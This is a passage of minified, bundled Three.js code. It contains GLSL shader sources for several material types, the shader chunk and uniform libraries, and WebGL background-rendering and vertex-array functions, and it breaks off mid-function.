	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,R1=`#define STANDARD
varying vec3 vViewPosition;
#ifdef USE_TRANSMISSION
	varying vec3 vWorldPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
#ifdef USE_TRANSMISSION
	vWorldPosition = worldPosition.xyz;
#endif
}`,P1=`#define STANDARD
#ifdef PHYSICAL
	#define IOR
	#define USE_SPECULAR
#endif
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float roughness;
uniform float metalness;
uniform float opacity;
#ifdef IOR
	uniform float ior;
#endif
#ifdef USE_SPECULAR
	uniform float specularIntensity;
	uniform vec3 specularColor;
	#ifdef USE_SPECULAR_COLORMAP
		uniform sampler2D specularColorMap;
	#endif
	#ifdef USE_SPECULAR_INTENSITYMAP
		uniform sampler2D specularIntensityMap;
	#endif
#endif
#ifdef USE_CLEARCOAT
	uniform float clearcoat;
	uniform float clearcoatRoughness;
#endif
#ifdef USE_DISPERSION
	uniform float dispersion;
#endif
#ifdef USE_IRIDESCENCE
	uniform float iridescence;
	uniform float iridescenceIOR;
	uniform float iridescenceThicknessMinimum;
	uniform float iridescenceThicknessMaximum;
#endif
#ifdef USE_SHEEN
	uniform vec3 sheenColor;
	uniform float sheenRoughness;
	#ifdef USE_SHEEN_COLORMAP
		uniform sampler2D sheenColorMap;
	#endif
	#ifdef USE_SHEEN_ROUGHNESSMAP
		uniform sampler2D sheenRoughnessMap;
	#endif
#endif
#ifdef USE_ANISOTROPY
	uniform vec2 anisotropyVector;
	#ifdef USE_ANISOTROPYMAP
		uniform sampler2D anisotropyMap;
	#endif
#endif
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <iridescence_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_physical_pars_fragment>
#include <transmission_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <clearcoat_pars_fragment>
#include <iridescence_pars_fragment>
#include <roughnessmap_pars_fragment>
#include <metalnessmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <roughnessmap_fragment>
	#include <metalnessmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <clearcoat_normal_fragment_begin>
	#include <clearcoat_normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_physical_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;
	vec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;
	#include <transmission_fragment>
	vec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;
	#ifdef USE_SHEEN
 
		outgoingLight = outgoingLight + sheenSpecularDirect + sheenSpecularIndirect;
 
 	#endif
	#ifdef USE_CLEARCOAT
		float dotNVcc = saturate( dot( geometryClearcoatNormal, geometryViewDir ) );
		vec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );
		outgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + ( clearcoatSpecularDirect + clearcoatSpecularIndirect ) * material.clearcoat;
	#endif
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,L1=`#define TOON
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,k1=`#define TOON
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <gradientmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_toon_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_toon_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,N1=`uniform float size;
uniform float scale;
#include <common>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
#ifdef USE_POINTS_UV
	varying vec2 vUv;
	uniform mat3 uvTransform;
#endif
void main() {
	#ifdef USE_POINTS_UV
		vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	#endif
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	gl_PointSize = size;
	#ifdef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );
	#endif
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <fog_vertex>
}`,D1=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <color_pars_fragment>
#include <map_particle_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_particle_fragment>
	#include <color_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,I1=`#include <common>
#include <batching_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <shadowmap_pars_vertex>
void main() {
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,U1=`uniform vec3 color;
uniform float opacity;
#include <common>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <logdepthbuf_pars_fragment>
#include <shadowmap_pars_fragment>
#include <shadowmask_pars_fragment>
void main() {
	#include <logdepthbuf_fragment>
	gl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,O1=`uniform float rotation;
uniform vec2 center;
#include <common>
#include <uv_pars_vertex>
#include <fog_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	vec4 mvPosition = modelViewMatrix[ 3 ];
	vec2 scale = vec2( length( modelMatrix[ 0 ].xyz ), length( modelMatrix[ 1 ].xyz ) );
	#ifndef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) scale *= - mvPosition.z;
	#endif
	vec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;
	vec2 rotatedPosition;
	rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;
	rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;
	mvPosition.xy += rotatedPosition;
	gl_Position = projectionMatrix * mvPosition;
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,F1=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,Be={alphahash_fragment:aM,alphahash_pars_fragment:oM,alphamap_fragment:lM,alphamap_pars_fragment:cM,alphatest_fragment:uM,alphatest_pars_fragment:dM,aomap_fragment:pM,aomap_pars_fragment:hM,batching_pars_vertex:fM,batching_vertex:mM,begin_vertex:gM,beginnormal_vertex:vM,bsdfs:_M,iridescence_fragment:xM,bumpmap_pars_fragment:yM,clipping_planes_fragment:SM,clipping_planes_pars_fragment:bM,clipping_planes_pars_vertex:wM,clipping_planes_vertex:MM,color_fragment:EM,color_pars_fragment:TM,color_pars_vertex:AM,color_vertex:CM,common:RM,cube_uv_reflection_fragment:PM,defaultnormal_vertex:LM,displacementmap_pars_vertex:kM,displacementmap_vertex:NM,emissivemap_fragment:DM,emissivemap_pars_fragment:IM,colorspace_fragment:UM,colorspace_pars_fragment:OM,envmap_fragment:FM,envmap_common_pars_fragment:BM,envmap_pars_fragment:zM,envmap_pars_vertex:VM,envmap_physical_pars_fragment:JM,envmap_vertex:HM,fog_vertex:GM,fog_pars_vertex:WM,fog_fragment:jM,fog_pars_fragment:XM,gradientmap_pars_fragment:qM,lightmap_pars_fragment:YM,lights_lambert_fragment:$M,lights_lambert_pars_fragment:KM,lights_pars_begin:ZM,lights_toon_fragment:QM,lights_toon_pars_fragment:eE,lights_phong_fragment:tE,lights_phong_pars_fragment:nE,lights_physical_fragment:iE,lights_physical_pars_fragment:sE,lights_fragment_begin:rE,lights_fragment_maps:aE,lights_fragment_end:oE,logdepthbuf_fragment:lE,logdepthbuf_pars_fragment:cE,logdepthbuf_pars_vertex:uE,logdepthbuf_vertex:dE,map_fragment:pE,map_pars_fragment:hE,map_particle_fragment:fE,map_particle_pars_fragment:mE,metalnessmap_fragment:gE,metalnessmap_pars_fragment:vE,morphinstance_vertex:_E,morphcolor_vertex:xE,morphnormal_vertex:yE,morphtarget_pars_vertex:SE,morphtarget_vertex:bE,normal_fragment_begin:wE,normal_fragment_maps:ME,normal_pars_fragment:EE,normal_pars_vertex:TE,normal_vertex:AE,normalmap_pars_fragment:CE,clearcoat_normal_fragment_begin:RE,clearcoat_normal_fragment_maps:PE,clearcoat_pars_fragment:LE,iridescence_pars_fragment:kE,opaque_fragment:NE,packing:DE,premultiplied_alpha_fragment:IE,project_vertex:UE,dithering_fragment:OE,dithering_pars_fragment:FE,roughnessmap_fragment:BE,roughnessmap_pars_fragment:zE,shadowmap_pars_fragment:VE,shadowmap_pars_vertex:HE,shadowmap_vertex:GE,shadowmask_pars_fragment:WE,skinbase_vertex:jE,skinning_pars_vertex:XE,skinning_vertex:qE,skinnormal_vertex:YE,specularmap_fragment:$E,specularmap_pars_fragment:KE,tonemapping_fragment:ZE,tonemapping_pars_fragment:JE,transmission_fragment:QE,transmission_pars_fragment:e1,uv_pars_fragment:t1,uv_pars_vertex:n1,uv_vertex:i1,worldpos_vertex:s1,background_vert:r1,background_frag:a1,backgroundCube_vert:o1,backgroundCube_frag:l1,cube_vert:c1,cube_frag:u1,depth_vert:d1,depth_frag:p1,distance_vert:h1,distance_frag:f1,equirect_vert:m1,equirect_frag:g1,linedashed_vert:v1,linedashed_frag:_1,meshbasic_vert:x1,meshbasic_frag:y1,meshlambert_vert:S1,meshlambert_frag:b1,meshmatcap_vert:w1,meshmatcap_frag:M1,meshnormal_vert:E1,meshnormal_frag:T1,meshphong_vert:A1,meshphong_frag:C1,meshphysical_vert:R1,meshphysical_frag:P1,meshtoon_vert:L1,meshtoon_frag:k1,points_vert:N1,points_frag:D1,shadow_vert:I1,shadow_frag:U1,sprite_vert:O1,sprite_frag:F1},pe={common:{diffuse:{value:new Ie(16777215)},opacity:{value:1},map:{value:null},mapTransform:{value:new Fe},alphaMap:{value:null},alphaMapTransform:{value:new Fe},alphaTest:{value:0}},specularmap:{specularMap:{value:null},specularMapTransform:{value:new Fe}},envmap:{envMap:{value:null},envMapRotation:{value:new Fe},flipEnvMap:{value:-1},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98},dfgLUT:{value:null}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1},aoMapTransform:{value:new Fe}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1},lightMapTransform:{value:new Fe}},bumpmap:{bumpMap:{value:null},bumpMapTransform:{value:new Fe},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalMapTransform:{value:new Fe},normalScale:{value:new et(1,1)}},displacementmap:{displacementMap:{value:null},displacementMapTransform:{value:new Fe},displacementScale:{value:1},displacementBias:{value:0}},emissivemap:{emissiveMap:{value:null},emissiveMapTransform:{value:new Fe}},metalnessmap:{metalnessMap:{value:null},metalnessMapTransform:{value:new Fe}},roughnessmap:{roughnessMap:{value:null},roughnessMapTransform:{value:new Fe}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new Ie(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotLightMap:{value:[]},spotShadowMap:{value:[]},spotLightMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new Ie(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaMapTransform:{value:new Fe},alphaTest:{value:0},uvTransform:{value:new Fe}},sprite:{diffuse:{value:new Ie(16777215)},opacity:{value:1},center:{value:new et(.5,.5)},rotation:{value:0},map:{value:null},mapTransform:{value:new Fe},alphaMap:{value:null},alphaMapTransform:{value:new Fe},alphaTest:{value:0}}},Qn={basic:{uniforms:en([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.fog]),vertexShader:Be.meshbasic_vert,fragmentShader:Be.meshbasic_frag},lambert:{uniforms:en([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,pe.lights,{emissive:{value:new Ie(0)}}]),vertexShader:Be.meshlambert_vert,fragmentShader:Be.meshlambert_frag},phong:{uniforms:en([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,pe.lights,{emissive:{value:new Ie(0)},specular:{value:new Ie(1118481)},shininess:{value:30}}]),vertexShader:Be.meshphong_vert,fragmentShader:Be.meshphong_frag},standard:{uniforms:en([pe.common,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.roughnessmap,pe.metalnessmap,pe.fog,pe.lights,{emissive:{value:new Ie(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:Be.meshphysical_vert,fragmentShader:Be.meshphysical_frag},toon:{uniforms:en([pe.common,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.gradientmap,pe.fog,pe.lights,{emissive:{value:new Ie(0)}}]),vertexShader:Be.meshtoon_vert,fragmentShader:Be.meshtoon_frag},matcap:{uniforms:en([pe.common,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,{matcap:{value:null}}]),vertexShader:Be.meshmatcap_vert,fragmentShader:Be.meshmatcap_frag},points:{uniforms:en([pe.points,pe.fog]),vertexShader:Be.points_vert,fragmentShader:Be.points_frag},dashed:{uniforms:en([pe.common,pe.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Be.linedashed_vert,fragmentShader:Be.linedashed_frag},depth:{uniforms:en([pe.common,pe.displacementmap]),vertexShader:Be.depth_vert,fragmentShader:Be.depth_frag},normal:{uniforms:en([pe.common,pe.bumpmap,pe.normalmap,pe.displacementmap,{opacity:{value:1}}]),vertexShader:Be.meshnormal_vert,fragmentShader:Be.meshnormal_frag},sprite:{uniforms:en([pe.sprite,pe.fog]),vertexShader:Be.sprite_vert,fragmentShader:Be.sprite_frag},background:{uniforms:{uvTransform:{value:new Fe},t2D:{value:null},backgroundIntensity:{value:1}},vertexShader:Be.background_vert,fragmentShader:Be.background_frag},backgroundCube:{uniforms:{envMap:{value:null},flipEnvMap:{value:-1},backgroundBlurriness:{value:0},backgroundIntensity:{value:1},backgroundRotation:{value:new Fe}},vertexShader:Be.backgroundCube_vert,fragmentShader:Be.backgroundCube_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:Be.cube_vert,fragmentShader:Be.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:Be.equirect_vert,fragmentShader:Be.equirect_frag},distance:{uniforms:en([pe.common,pe.displacementmap,{referencePosition:{value:new B},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:Be.distance_vert,fragmentShader:Be.distance_frag},shadow:{uniforms:en([pe.lights,pe.fog,{color:{value:new Ie(0)},opacity:{value:1}}]),vertexShader:Be.shadow_vert,fragmentShader:Be.shadow_frag}};Qn.physical={uniforms:en([Qn.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatMapTransform:{value:new Fe},clearcoatNormalMap:{value:null},clearcoatNormalMapTransform:{value:new Fe},clearcoatNormalScale:{value:new et(1,1)},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatRoughnessMapTransform:{value:new Fe},dispersion:{value:0},iridescence:{value:0},iridescenceMap:{value:null},iridescenceMapTransform:{value:new Fe},iridescenceIOR:{value:1.3},iridescenceThicknessMinimum:{value:100},iridescenceThicknessMaximum:{value:400},iridescenceThicknessMap:{value:null},iridescenceThicknessMapTransform:{value:new Fe},sheen:{value:0},sheenColor:{value:new Ie(0)},sheenColorMap:{value:null},sheenColorMapTransform:{value:new Fe},sheenRoughness:{value:1},sheenRoughnessMap:{value:null},sheenRoughnessMapTransform:{value:new Fe},transmission:{value:0},transmissionMap:{value:null},transmissionMapTransform:{value:new Fe},transmissionSamplerSize:{value:new et},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},thicknessMapTransform:{value:new Fe},attenuationDistance:{value:0},attenuationColor:{value:new Ie(0)},specularColor:{value:new Ie(1,1,1)},specularColorMap:{value:null},specularColorMapTransform:{value:new Fe},specularIntensity:{value:1},specularIntensityMap:{value:null},specularIntensityMapTransform:{value:new Fe},anisotropyVector:{value:new et},anisotropyMap:{value:null},anisotropyMapTransform:{value:new Fe}}]),vertexShader:Be.meshphysical_vert,fragmentShader:Be.meshphysical_frag};const qo={r:0,b:0,g:0},ys=new ci,B1=new _t;function z1(t,e,n,i,s,r,a){const o=new Ie(0);let l=r===!0?0:1,c,d,p=null,h=0,f=null;function _(x){let S=x.isScene===!0?x.background:null;return S&&S.isTexture&&(S=(x.backgroundBlurriness>0?n:e).get(S)),S}function y(x){let S=!1;const T=_(x);T===null?u(o,l):T&&T.isColor&&(u(T,1),S=!0);const A=t.xr.getEnvironmentBlendMode();A==="additive"?i.buffers.color.setClear(0,0,0,1,a):A==="alpha-blend"&&i.buffers.color.setClear(0,0,0,0,a),(t.autoClear||S)&&(i.buffers.depth.setTest(!0),i.buffers.depth.setMask(!0),i.buffers.color.setMask(!0),t.clear(t.autoClearColor,t.autoClearDepth,t.autoClearStencil))}function m(x,S){const T=_(S);T&&(T.isCubeTexture||T.mapping===ac)?(d===void 0&&(d=new Ot(new wi(1,1,1),new ui({name:"BackgroundCubeMaterial",uniforms:Fr(Qn.backgroundCube.uniforms),vertexShader:Qn.backgroundCube.vertexShader,fragmentShader:Qn.backgroundCube.fragmentShader,side:mn,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),d.geometry.deleteAttribute("normal"),d.geometry.deleteAttribute("uv"),d.onBeforeRender=function(A,R,N){this.matrixWorld.copyPosition(N.matrixWorld)},Object.defineProperty(d.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),s.update(d)),ys.copy(S.backgroundRotation),ys.x*=-1,ys.y*=-1,ys.z*=-1,T.isCubeTexture&&T.isRenderTargetTexture===!1&&(ys.y*=-1,ys.z*=-1),d.material.uniforms.envMap.value=T,d.material.uniforms.flipEnvMap.value=T.isCubeTexture&&T.isRenderTargetTexture===!1?-1:1,d.material.uniforms.backgroundBlurriness.value=S.backgroundBlurriness,d.material.uniforms.backgroundIntensity.value=S.backgroundIntensity,d.material.uniforms.backgroundRotation.value.setFromMatrix4(B1.makeRotationFromEuler(ys)),d.material.toneMapped=Ye.getTransfer(T.colorSpace)!==st,(p!==T||h!==T.version||f!==t.toneMapping)&&(d.material.needsUpdate=!0,p=T,h=T.version,f=t.toneMapping),d.layers.enableAll(),x.unshift(d,d.geometry,d.material,0,0,null)):T&&T.isTexture&&(c===void 0&&(c=new Ot(new ao(2,2),new ui({name:"BackgroundMaterial",uniforms:Fr(Qn.background.uniforms),vertexShader:Qn.background.vertexShader,fragmentShader:Qn.background.fragmentShader,side:cs,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),c.geometry.deleteAttribute("normal"),Object.defineProperty(c.material,"map",{get:function(){return this.uniforms.t2D.value}}),s.update(c)),c.material.uniforms.t2D.value=T,c.material.uniforms.backgroundIntensity.value=S.backgroundIntensity,c.material.toneMapped=Ye.getTransfer(T.colorSpace)!==st,T.matrixAutoUpdate===!0&&T.updateMatrix(),c.material.uniforms.uvTransform.value.copy(T.matrix),(p!==T||h!==T.version||f!==t.toneMapping)&&(c.material.needsUpdate=!0,p=T,h=T.version,f=t.toneMapping),c.layers.enableAll(),x.unshift(c,c.geometry,c.material,0,0,null))}function u(x,S){x.getRGB(qo,Q0(t)),i.buffers.color.setClear(qo.r,qo.g,qo.b,S,a)}function g(){d!==void 0&&(d.geometry.dispose(),d.material.dispose(),d=void 0),c!==void 0&&(c.geometry.dispose(),c.material.dispose(),c=void 0)}return{getClearColor:function(){return o},setClearColor:function(x,S=1){o.set(x),l=S,u(o,l)},getClearAlpha:function(){return l},setClearAlpha:function(x){l=x,u(o,l)},render:y,addToRenderList:m,dispose:g}}function V1(t,e){const n=t.getParameter(t.MAX_VERTEX_ATTRIBS),i={},s=h(null);let r=s,a=!1;function o(w,P,z,V,Z){let $=!1;const X=p(V,z,P);r!==X&&(r=X,c(r.object)),$=f(w,V,z,Z),$&&_(w,V,z,Z),Z!==null&&e.update(Z,t.ELEMENT_ARRAY_BUFFER),($||a)&&(a=!1,S(w,P,z,V),Z!==null&&t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,e.get(Z).buffer))}function l(){return t.createVertexArray()}function c(w){return t.bindVertexArray(w)}function d(w){return t.deleteVertexArray(w)}function p(w,P,z){const V=z.wireframe===!0;let Z=i[w.id];Z===void 0&&(Z={},i[w.id]=Z);let $=Z[P.id];$===void 0&&($={},Z[P.id]=$);let X=$[V];return X===void 0&&(X=h(l()),$[V]=X),X}function h(w){const P=[],z=[],V=[];for(let Z=0;Z<n;Z++)P[Z]=0,z[Z]=0,V[Z]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:P,enabledAttributes:z,attributeDivisors:V,object:w,attributes:{},index:null}}function f(w,P,z,V){const Z=r.attributes,$=P.attributes;let X=0;const H=z.getAttributes();for(const I in H)if(H[I].location>=0){const K=Z[I];let ne=$[I];if(ne===void 0&&(I==="instanceMatrix"&&w.instanceMatrix&&(ne=w.instanceMatrix),I==="instanceColor"&&w.instanceColor&&(ne=w.instanceColor)),K===void 0||K.attribute!==ne||ne&&K.data!==ne.data)return!0;X++}return r.attributesNum!==X||r.index!==V}function _(w,P,z,V){const Z={},$=P.attributes;let X=0;const H=z.getAttributes();for(const I in H)if(H[I].location>=0){let K=$[I];K===void 0&&(I==="instanceMatrix"&&w.instanceMatrix&&(K=w.instanceMatrix),I==="instanceColor"&&w.instanceColor&&(K=w.instanceColor));const ne={};ne.attribute=K,K&&K.data&&(ne.data=K.data),Z[I]=ne,X++}r.attributes=Z,r.attributesNum=X,r.index=V}function y(){const w=r.newAttributes;for(let P=0,z=w.length;P<z;P++)w[P]=0}function m(w){u(w,0)}function u(w,P){const 